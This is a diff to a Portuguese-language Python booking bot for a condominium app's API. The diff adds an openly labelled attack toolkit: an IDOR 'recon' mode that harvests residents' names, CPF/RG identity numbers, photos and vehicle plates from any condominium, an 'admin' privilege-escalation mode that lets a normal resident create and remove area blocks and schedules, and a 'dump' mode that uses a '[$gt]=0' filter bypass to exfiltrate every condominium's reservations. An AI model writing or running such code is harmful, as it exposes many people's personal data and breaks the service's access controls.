@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Hub 2.0 - Auto Booking ⚡
-Multi-conta, sniper, espiao, radar, ranking — tudo via API direta.
+Multi-conta, sniper, espiao, radar, ranking, recon, admin, dump — tudo via API direta.
 Mais rapido que o app — reserva em milissegundos.
 
 Uso interativo:  python3 auto_booking.py
@@ -14,6 +14,11 @@ Minhas reservas: python3 auto_booking.py --minhas
 Cancelar:        python3 auto_booking.py --cancelar 1332211
 Espiao:          python3 auto_booking.py --espiao 2026-03-20
 Trocar reserva:  python3 auto_booking.py --trocar 1332211
+Recon condo:     python3 auto_booking.py --recon
+Recon outro:     python3 auto_booking.py --recon --condo 2079
+Admin bloqueio:  python3 auto_booking.py --bloquear --area 17 --descricao "Manutencao" --data 2026-04-01
+Admin desbloq:   python3 auto_booking.py --desbloquear 119439
+Dump massivo:    python3 auto_booking.py --dump
 Usar conta N:    python3 auto_booking.py --conta 2 --minhas
 """
 
@@ -210,6 +215,130 @@ class HubClient:
         return [
             x for x in r.json() if x["condominio"]["codigo"] == self.account.condominio
         ]
+
+    # ===== RECON (IDOR cross-condo) =====
+
+    def recon_moradores(self, condo: int | None = None) -> list[dict]:
+        condo = condo or self.account.condominio
+        r = self.session.get(
+            f"{API_MORADOR}/api/v1/liberacaoAcesso/{condo}/ativas"
+        )
+        if r.status_code == 204:
+            return []
+        r.raise_for_status()
+        return r.json()
+
+    def recon_veiculos(self, condo: int | None = None) -> list[dict]:
+        condo = condo or self.account.condominio
+        r = self.session.get(
+            f"{API_MORADOR}/api/v1/portaria/{condo}/veiculo"
+        )
+        if r.status_code == 204:
+            return []
+        r.raise_for_status()
+        return r.json()
+
+    def recon_config(self, condo: int | None = None) -> list[dict]:
+        condo = condo or self.account.condominio
+        r = self.session.get(
+            f"{API_MORADOR}/api/v1/areaConfiguracao/{condo}"
+        )
+        if r.status_code == 204:
+            return []
+        r.raise_for_status()
+        return r.json()
+
+    def recon_app(self, condo: int | None = None) -> dict:
+        condo = condo or self.account.condominio
+        r = self.session.get(
+            f"{API_MORADOR}/api/v1/aplicativo/{condo}"
+        )
+        if r.status_code == 204:
+            return {}
+        r.raise_for_status()
+        return r.json()
+
+    # ===== ADMIN (privilege escalation) =====
+
+    def listar_bloqueios(self, condo: int | None = None) -> list[dict]:
+        condo = condo or self.account.condominio
+        r = self.session.get(
+            f"{API_MORADOR}/api/v1/areaConfiguracao/{condo}/bloqueio"
+        )
+        if r.status_code == 204:
+            return []
+        r.raise_for_status()
+        return r.json()
+
+    def criar_bloqueio(self, area: int, descricao: str, inicio: str, fim: str) -> dict:
+        r = self.session.post(
+            f"{API_MORADOR}/api/v1/areaConfiguracao/{area}/bloqueio",
+            json={
+                "CodigoArea": area,
+                "Descricao": descricao,
+                "DataInicio": f"{inicio}T00:00:00",
+                "DataFim": f"{fim}T23:59:59",
+                "CodigoCondominio": self.account.condominio,
+            },
+        )
+        return {"status": r.status_code, "body": r.json() if r.text else r.text}
+
+    def remover_bloqueio(self, area: int, bloqueio_id: int, bloqueio_data: dict) -> dict:
+        r = self.session.put(
+            f"{API_MORADOR}/api/v1/areaConfiguracao/{area}/bloqueio/{bloqueio_id}",
+            json={
+                "CodigoArea": area,
+                "CodigoBloqueio": bloqueio_id,
+                "Ativo": False,
+                "Descricao": bloqueio_data.get("descricao", "removed"),
+                "DataInicio": bloqueio_data.get("dataInicio"),
+                "DataFim": bloqueio_data.get("dataFim"),
+            },
+        )
+        return {"status": r.status_code, "body": r.json() if r.text else r.text}
+
+    def listar_horarios_config(self, area: int) -> list[dict]:
+        r = self.session.get(
+            f"{API_MORADOR}/api/v1/areaConfiguracao/{area}/horario"
+        )
+        if r.status_code == 204:
+            return []
+        r.raise_for_status()
+        return r.json()
+
+    def criar_horario(self, area: int, config: dict) -> dict:
+        payload = {"CodigoArea": area, **config}
+        r = self.session.post(
+            f"{API_MORADOR}/api/v1/areaConfiguracao/{area}/horario",
+            json=payload,
+        )
+        return {"status": r.status_code, "body": r.json() if r.text else r.text}
+
+    def deletar_horario(self, config_id: int) -> dict:
+        r = self.session.delete(
+            f"{API_MORADOR}/api/v1/areaConfiguracao/{config_id}/horario"
+        )
+        return {"status": r.status_code, "body": r.json() if r.text else r.text}
+
+    # ===== DUMP (mass data exfiltration) =====
+
+    def dump_all_reservas(self) -> list[dict]:
+        r = self.session.get(
+            f"{API_MORADOR}/api/v1/reservas",
+            params={"codigoCondominio[$gt]": "0"},
+            timeout=60,
+        )
+        r.raise_for_status()
+        return r.json()
+
+    def dump_all_areas(self) -> list[dict]:
+        r = self.session.get(
+            f"{API_MORADOR}/api/v1/areas",
+            params={"codigoCondominio[$gt]": "0"},
+            timeout=60,
+        )
+        r.raise_for_status()
+        return r.json()
 
 
 # ===== DISPLAY FUNCTIONS =====
@@ -791,6 +920,304 @@ def trocar_cli(clients: list[HubClient], cod_reserva: int, conta_src: int, conta
     print(f"  {R}💀 Falhou. Reserva #{cod_reserva} foi cancelada mas nova nao criou!{RST}")
 
 
+# ===== RECON =====
+
+
+def recon(client: HubClient, condo: int | None = None) -> None:
+    condo = condo or client.account.condominio
+    print(f"\n  {M}{BOLD}🔍 RECON — Condominio {condo}{RST}\n")
+
+    # Moradores
+    print(f"  {C}{BOLD}👥 Moradores (liberacaoAcesso){RST}\n")
+    moradores = client.recon_moradores(condo)
+    if moradores:
+        print(
+            f"  {BOLD}{'#':>4}  {'Nome':<35}  {'CPF':<14}  {'RG':<12}  {'Unidade':<8}  {'Tipo'}{RST}"
+        )
+        print(f"  {'-' * 100}")
+        for i, m in enumerate(moradores[:50], 1):
+            nome = m.get("nome", "?")[:34]
+            cpf = m.get("cpf", "?")
+            rg = m.get("rg", "")[:11]
+            unid = m.get("unidade", "?")
+            tipo_raw = m.get("tipoAcesso", "?")
+            tipo = tipo_raw.get("descricao", "?") if isinstance(tipo_raw, dict) else str(tipo_raw)
+            foto = " 📷" if m.get("foto") else ""
+            print(
+                f"  {i:>4}  {nome:<35}  {cpf:<14}  {rg:<12}  {unid:<8}  {tipo}{foto}"
+            )
+        if len(moradores) > 50:
+            print(f"\n  {DIM}... e mais {len(moradores) - 50} moradores{RST}")
+        print(f"\n  {G}{BOLD}Total: {len(moradores)} moradores{RST}")
+    else:
+        print(f"  {DIM}Sem dados de moradores.{RST}")
+
+    # Veiculos
+    print(f"\n  {C}{BOLD}🚗 Veiculos (portaria){RST}\n")
+    veiculos = client.recon_veiculos(condo)
+    if veiculos:
+        print(
+            f"  {BOLD}{'#':>4}  {'Placa':<10}  {'Dono':<30}  {'Unidade':<8}  {'Tipo':<12}  {'Marca/Modelo'}{RST}"
+        )
+        print(f"  {'-' * 100}")
+        for i, v in enumerate(veiculos[:50], 1):
+            placa = v.get("placa", "?")
+            nome = v.get("nome", "?")[:29]
+            unid = v.get("unidade", "?")
+            tipo = v.get("tipoVeiculoDescricao", "?")[:11]
+            marca = f"{v.get('marca', '')} {v.get('modelo', '')} {v.get('cor', '')}".strip()[:20]
+            print(
+                f"  {i:>4}  {placa:<10}  {nome:<30}  {unid:<8}  {tipo:<12}  {marca}"
+            )
+        if len(veiculos) > 50:
+            print(f"\n  {DIM}... e mais {len(veiculos) - 50} veiculos{RST}")
+        print(f"\n  {G}{BOLD}Total: {len(veiculos)} veiculos{RST}")
+    else:
+        print(f"  {DIM}Sem dados de veiculos.{RST}")
+
+    # Salvar JSON
+    out_dir = Path(__file__).parent / "recon"
+    out_dir.mkdir(exist_ok=True)
+    if moradores:
+        p = out_dir / f"moradores_{condo}.json"
+        p.write_text(json.dumps(moradores, indent=2, ensure_ascii=False))
+        print(f"\n  {DIM}📁 Moradores salvos em {p}{RST}")
+    if veiculos:
+        p = out_dir / f"veiculos_{condo}.json"
+        p.write_text(json.dumps(veiculos, indent=2, ensure_ascii=False))
+        print(f"  {DIM}📁 Veiculos salvos em {p}{RST}")
+
+
+# ===== ADMIN MODE =====
+
+
+def admin_bloqueios(client: HubClient) -> None:
+    while True:
+        print(f"\n  {R}{BOLD}🔒 ADMIN — Gerenciar Bloqueios{RST}")
+        print(f"  {DIM}[L] Listar  [C] Criar  [R] Remover  [V] Voltar{RST}")
+        op = input("  > ").strip().upper()
+
+        if op == "L":
+            bloqueios = client.listar_bloqueios()
+            if not bloqueios:
+                print(f"  {DIM}Nenhum bloqueio ativo.{RST}")
+                continue
+            print(
+                f"\n  {BOLD}{'ID':>8}  {'Area':<6}  {'Descricao':<30}  "
+                f"{'Inicio':<12}  {'Fim':<12}  {'Ativo'}{RST}"
+            )
+            print(f"  {'-' * 90}")
+            for b in bloqueios:
+                bid = b.get("codigoBloqueio", "?")
+                area = b.get("codigoArea", "?")
+                desc = b.get("descricao", "?")[:29]
+                ini = b.get("dataInicio", "?")[:10]
+                fim = b.get("dataFim", "?")[:10]
+                ativo = f"{G}Sim{RST}" if b.get("ativo") else f"{R}Nao{RST}"
+                nome_area = b.get("nomeArea", "")[:15]
+                print(
+                    f"  {bid:>8}  {area:<6}  {desc:<30}  {ini:<12}  {fim:<12}  {ativo}  {DIM}{nome_area}{RST}"
+                )
+
+        elif op == "C":
+            area = int(input("  Codigo da area: ").strip())
+            desc = input("  Descricao: ").strip() or "Bloqueio"
+            ini = input("  Data inicio (YYYY-MM-DD): ").strip()
+            fim = input("  Data fim (YYYY-MM-DD) [=inicio]: ").strip() or ini
+            r = client.criar_bloqueio(area, desc, ini, fim)
+            if r["status"] == 200:
+                print(f"  {G}{BOLD}✅ Bloqueio criado! ID: {r['body']}{RST}")
+            else:
+                print(f"  {R}❌ Erro: {r['body']}{RST}")
+
+        elif op == "R":
+            bid = int(input("  ID do bloqueio: ").strip())
+            # Buscar dados do bloqueio
+            bloqueios = client.listar_bloqueios()
+            bloqueio = next(
+                (b for b in bloqueios if b.get("codigoBloqueio") == bid), None
+            )
+            if not bloqueio:
+                print(f"  {R}Bloqueio {bid} nao encontrado.{RST}")
+                continue
+            area = bloqueio["codigoArea"]
+            r = client.remover_bloqueio(area, bid, bloqueio)
+            if r["status"] == 200:
+                print(f"  {G}{BOLD}✅ Bloqueio {bid} desativado!{RST}")
+            else:
+                print(f"  {R}❌ Erro: {r['body']}{RST}")
+
+        elif op == "V":
+            return
+
+
+def admin_horarios(client: HubClient) -> None:
+    while True:
+        print(f"\n  {R}{BOLD}⏰ ADMIN — Gerenciar Horarios{RST}")
+        print(f"  {DIM}[L] Listar  [C] Criar  [D] Deletar  [V] Voltar{RST}")
+        op = input("  > ").strip().upper()
+
+        if op == "L":
+            area = int(input("  Codigo da area: ").strip())
+            horarios = client.listar_horarios_config(area)
+            if not horarios:
+                print(f"  {DIM}Sem horarios configurados.{RST}")
+                continue
+            dias = ["seg", "ter", "qua", "qui", "sex", "sab", "dom"]
+            print(
+                f"\n  {BOLD}{'ID':>6}  {'Dias':<25}  "
+                f"{'Inicio':<8}  {'Fim':<8}  {'Disp'}{RST}"
+            )
+            print(f"  {'-' * 60}")
+            for h in horarios:
+                hid = h.get("codigoConfiguracaoArea", "?")
+                d_list = []
+                for d, nome in zip(
+                    ["segunda", "terca", "quarta", "quinta", "sexta", "sabado", "domingo"],
+                    dias,
+                ):
+                    if h.get(d):
+                        d_list.append(nome)
+                dias_str = ", ".join(d_list)
+                h_ini = h.get("horaInicio", "?")[11:16] if h.get("horaInicio") else "?"
+                h_fim = h.get("horaFim", "?")[11:16] if h.get("horaFim") else "?"
+                disp = f"{G}Sim{RST}" if h.get("horaDisponivel") else f"{R}Nao{RST}"
+                print(f"  {hid:>6}  {dias_str:<25}  {h_ini:<8}  {h_fim:<8}  {disp}")
+
+        elif op == "C":
+            area = int(input("  Codigo da area: ").strip())
+            dias_str = input("  Dias (seg,ter,qua,qui,sex,sab,dom): ").strip().lower()
+            h_ini = input("  Hora inicio (HH:MM): ").strip()
+            h_fim = input("  Hora fim (HH:MM): ").strip()
+            disp = input("  Disponivel? (s/n) [s]: ").strip().lower() != "n"
+
+            dia_map = {
+                "seg": "Segunda", "ter": "Terca", "qua": "Quarta",
+                "qui": "Quinta", "sex": "Sexta", "sab": "Sabado", "dom": "Domingo",
+            }
+            config: dict = {}
+            for d in dias_str.split(","):
+                key = dia_map.get(d.strip())
+                if key:
+                    config[key] = True
+
+            config["HoraInicio"] = f"2026-01-01T{h_ini}:00"
+            config["HoraFim"] = f"2026-01-01T{h_fim}:00"
+            config["HoraDisponivel"] = disp
+
+            r = client.criar_horario(area, config)
+            if r["status"] == 200:
+                print(f"  {G}{BOLD}✅ Horario criado! ID: {r['body']}{RST}")
+            else:
+                print(f"  {R}❌ Erro: {r['body']}{RST}")
+
+        elif op == "D":
+            hid = int(input("  ID do horario: ").strip())
+            confirm = input(f"  {Y}Deletar horario {hid}? (s/n): {RST}").strip().lower()
+            if confirm == "s":
+                r = client.deletar_horario(hid)
+                if r["status"] == 200:
+                    print(f"  {G}{BOLD}✅ Horario {hid} deletado!{RST}")
+                else:
+                    print(f"  {R}❌ Erro: {r['body']}{RST}")
+
+        elif op == "V":
+            return
+
+
+def admin_mode(client: HubClient) -> None:
+    while True:
+        print(f"\n  {R}{BOLD}⚡ ADMIN MODE — Privilege Escalation{RST}")
+        print(f"  {DIM}Funcoes de sindico/admin acessiveis por morador normal{RST}\n")
+        print(f"  {C}│{RST} 1. Gerenciar bloqueios de area")
+        print(f"  {C}│{RST} 2. Gerenciar horarios de area")
+        print(f"  {C}│{RST} 3. Ver config completa de areas")
+        print(f"  {C}│{RST} 0. Voltar")
+        op = input(f"\n  > ").strip()
+
+        if op == "1":
+            admin_bloqueios(client)
+        elif op == "2":
+            admin_horarios(client)
+        elif op == "3":
+            config = client.recon_config()
+            print(f"\n  {BOLD}{len(config)} areas configuradas:{RST}\n")
+            for c_item in config:
+                dados = c_item.get("dados", {})
+                nome = dados.get("nomeArea", "?")
+                cod = dados.get("codigoArea", "?")
+                email = dados.get("emailResponsavel", "")
+                limite = dados.get("limiteReservasAberta", "?")
+                print(f"  {cod:>4}  {nome:<35}  Limite: {limite}  {DIM}{email}{RST}")
+        elif op == "0":
+            return
+
+
+# ===== DUMP MODE =====
+
+
+def dump_mode(client: HubClient) -> None:
+    print(f"\n  {R}{BOLD}💀 DUMP MODE — Exfiltracao massiva cross-condominio{RST}")
+    print(f"  {DIM}Usa bypass [$gt]=0 pra ignorar filtro de condominio{RST}\n")
+
+    out_dir = Path(__file__).parent / "dump"
+    out_dir.mkdir(exist_ok=True)
+
+    print(f"  {C}⏳ Baixando todas as reservas...{RST}", end=" ", flush=True)
+    try:
+        reservas = client.dump_all_reservas()
+        p = out_dir / "all_reservas.json"
+        p.write_text(json.dumps(reservas, indent=2, ensure_ascii=False))
+
+        # Stats
+        condos = set()
+        nomes = set()
+        for r in reservas:
+            c = r.get("condominio", {})
+            if isinstance(c, dict):
+                condos.add(c.get("codigo", 0))
+            nomes.add(r.get("nome", ""))
+        print(f"{G}OK{RST}")
+        print(f"  {G}{BOLD}📊 {len(reservas)} reservas | {len(condos)} condominios | {len(nomes)} moradores{RST}")
+        print(f"  {DIM}📁 Salvo em {p}{RST}")
+    except Exception as e:
+        print(f"{R}ERRO: {e}{RST}")
+
+    print(f"\n  {C}⏳ Baixando todas as areas...{RST}", end=" ", flush=True)
+    try:
+        areas = client.dump_all_areas()
+        p = out_dir / "all_areas.json"
+        p.write_text(json.dumps(areas, indent=2, ensure_ascii=False))
+
+        condos_a = set()
+        for a in areas:
+            c = a.get("condominio", {})
+            if isinstance(c, dict):
+                condos_a.add(c.get("codigo", 0))
+            elif isinstance(c, int):
+                condos_a.add(c)
+        print(f"{G}OK{RST}")
+        print(f"  {G}{BOLD}📊 {len(areas)} areas | {len(condos_a)} condominios{RST}")
+        print(f"  {DIM}📁 Salvo em {p}{RST}")
+    except Exception as e:
+        print(f"{R}ERRO: {e}{RST}")
+
+    # Top condominios por reservas
+    print(f"\n  {C}{BOLD}🏢 Top condominios por reservas:{RST}\n")
+    condo_count: dict[str, int] = {}
+    try:
+        for r in reservas:
+            c = r.get("condominio", {})
+            if isinstance(c, dict):
+                key = f"{c.get('codigo', '?')} - {c.get('descricao', '?')}"
+                condo_count[key] = condo_count.get(key, 0) + 1
+        for key, cnt in sorted(condo_count.items(), key=lambda x: -x[1])[:15]:
+            bar = "█" * min(cnt // 5, 30)
+            print(f"  {cnt:>5}  {bar} {key}")
+    except Exception:
+        pass
+
+
 # ===== GERENCIAR CONTAS =====
 
 
@@ -843,20 +1270,25 @@ def gerenciar_contas(accounts: list[Account]) -> list[Account]:
 
 def menu(clients: list[HubClient], accounts: list[Account]) -> None:
     while True:
-        print(f"\n  {C}┌──────────────────────────────────┐{RST}")
-        print(f"  {C}│{RST} 1. Gerenciar contas              {C}│{RST}")
-        print(f"  {C}│{RST} 2. Ver espacos                   {C}│{RST}")
-        print(f"  {C}│{RST} 3. Ver horarios                  {C}│{RST}")
-        print(f"  {C}│{RST} 4. Reservar                      {C}│{RST}")
-        print(f"  {C}│{RST} 5. Sniper (agendar meia-noite)   {C}│{RST}")
-        print(f"  {C}│{RST} 6. Minhas reservas               {C}│{RST}")
-        print(f"  {C}│{RST} 7. Cancelar reserva              {C}│{RST}")
-        print(f"  {C}│{RST} 8. Espiao (quem reservou)        {C}│{RST}")
-        print(f"  {C}│{RST} 9. Trocar reserva (cancel+book)  {C}│{RST}")
-        print(f"  {C}│{RST} 10. Radar (monitora cancelamento) {C}│{RST}")
-        print(f"  {C}│{RST} 11. Ranking (quem usa bot)        {C}│{RST}")
-        print(f"  {C}│{RST} 0. Sair                           {C}│{RST}")
-        print(f"  {C}└───────────────────────────────────┘{RST}")
+        print(f"\n  {C}┌───────────────────────────────────────┐{RST}")
+        print(f"  {C}│{RST}  1. Gerenciar contas                   {C}│{RST}")
+        print(f"  {C}│{RST}  2. Ver espacos                        {C}│{RST}")
+        print(f"  {C}│{RST}  3. Ver horarios                       {C}│{RST}")
+        print(f"  {C}│{RST}  4. Reservar                           {C}│{RST}")
+        print(f"  {C}│{RST}  5. Sniper (agendar meia-noite)        {C}│{RST}")
+        print(f"  {C}│{RST}  6. Minhas reservas                    {C}│{RST}")
+        print(f"  {C}│{RST}  7. Cancelar reserva                   {C}│{RST}")
+        print(f"  {C}│{RST}  8. Espiao (quem reservou)             {C}│{RST}")
+        print(f"  {C}│{RST}  9. Trocar reserva (cancel+book)       {C}│{RST}")
+        print(f"  {C}│{RST} 10. Radar (monitora cancelamento)      {C}│{RST}")
+        print(f"  {C}│{RST} 11. Ranking (quem usa bot)             {C}│{RST}")
+        print(f"  {C}├───────────────────────────────────────┤{RST}")
+        print(f"  {C}│{RST} {R}12. Recon (moradores + veiculos){RST}       {C}│{RST}")
+        print(f"  {C}│{RST} {R}13. Admin (bloqueios + horarios){RST}       {C}│{RST}")
+        print(f"  {C}│{RST} {R}14. Dump (todas reservas cross-condo){RST} {C}│{RST}")
+        print(f"  {C}├───────────────────────────────────────┤{RST}")
+        print(f"  {C}│{RST}  0. Sair                               {C}│{RST}")
+        print(f"  {C}└───────────────────────────────────────┘{RST}")
         for c in clients:
             if c.logged_in:
                 print(f"  {DIM}👤 {c.account.label}: {c.account.nome}{RST}")
@@ -996,6 +1428,28 @@ def menu(clients: list[HubClient], accounts: list[Account]) -> None:
             d = input("  Analisar ultimos N dias [7]: ").strip() or "7"
             ranking(c, int(d))
 
+        elif op == "12":
+            c = pick_client(clients, "Conta")
+            if not c:
+                continue
+            condo_str = input(
+                f"  Condominio [{c.account.condominio}]: "
+            ).strip()
+            condo_val = int(condo_str) if condo_str else None
+            recon(c, condo_val)
+
+        elif op == "13":
+            c = pick_client(clients, "Conta")
+            if not c:
+                continue
+            admin_mode(c)
+
+        elif op == "14":
+            c = pick_client(clients, "Conta")
+            if not c:
+                continue
+            dump_mode(c)
+
         elif op == "0":
             break
 
@@ -1028,6 +1482,16 @@ def main() -> None:
         "--ranking", action="store_true", help="Ranking de boteiros do condominio"
     )
     parser.add_argument("--dias", type=int, default=7, help="Dias pra analisar no ranking (default: 7)")
+    parser.add_argument("--recon", action="store_true", help="Recon: moradores + veiculos")
+    parser.add_argument("--condo", type=int, help="Condominio alvo (default: da conta)")
+    parser.add_argument("--dump", action="store_true", help="Dump massivo cross-condominio")
+    parser.add_argument(
+        "--bloquear", action="store_true",
+        help="Criar bloqueio de area (requer --area, --data, --descricao)"
+    )
+    parser.add_argument("--desbloquear", type=int, metavar="ID_BLOQUEIO", help="Remover bloqueio por ID")
+    parser.add_argument("--descricao", type=str, default="Bloqueio", help="Descricao do bloqueio")
+    parser.add_argument("--data-fim", type=str, help="Data fim do bloqueio (default: = --data)")
     parser.add_argument(
         "--conta-destino", type=int, default=2,
         help="Conta destino pra troca (default: 2)"
@@ -1077,12 +1541,40 @@ def main() -> None:
     has_action = any([
         args.listar, args.espiao, args.sniper, args.minhas,
         args.cancelar, args.trocar, args.radar, args.ranking, args.area,
+        args.recon, args.dump, args.bloquear, args.desbloquear,
     ])
     if has_action:
         idx = max(0, min(args.conta - 1, len(clients) - 1))
         client = clients[idx]
 
-        if args.ranking:
+        if args.recon:
+            recon(client, args.condo)
+        elif args.dump:
+            dump_mode(client)
+        elif args.bloquear and args.area and args.data:
+            fim = args.data_fim or args.data
+            r = client.criar_bloqueio(args.area, args.descricao, args.data, fim)
+            if r["status"] == 200:
+                print(f"  {G}✅ Bloqueio criado! ID: {r['body']}{RST}")
+            else:
+                print(f"  {R}❌ Erro: {r['body']}{RST}")
+        elif args.desbloquear:
+            bloqueios = client.listar_bloqueios()
+            bloqueio = next(
+                (b for b in bloqueios if b.get("codigoBloqueio") == args.desbloquear),
+                None,
+            )
+            if not bloqueio:
+                print(f"  {R}Bloqueio {args.desbloquear} nao encontrado.{RST}")
+            else:
+                r = client.remover_bloqueio(
+                    bloqueio["codigoArea"], args.desbloquear, bloqueio
+                )
+                if r["status"] == 200:
+                    print(f"  {G}✅ Bloqueio {args.desbloquear} desativado!{RST}")
+                else:
+                    print(f"  {R}❌ Erro: {r['body']}{RST}")
+        elif args.ranking:
             ranking(client, args.dias)
         elif args.radar and args.area and args.data:
             # Radar: --conta pra reservar, conta seguinte pra consultar
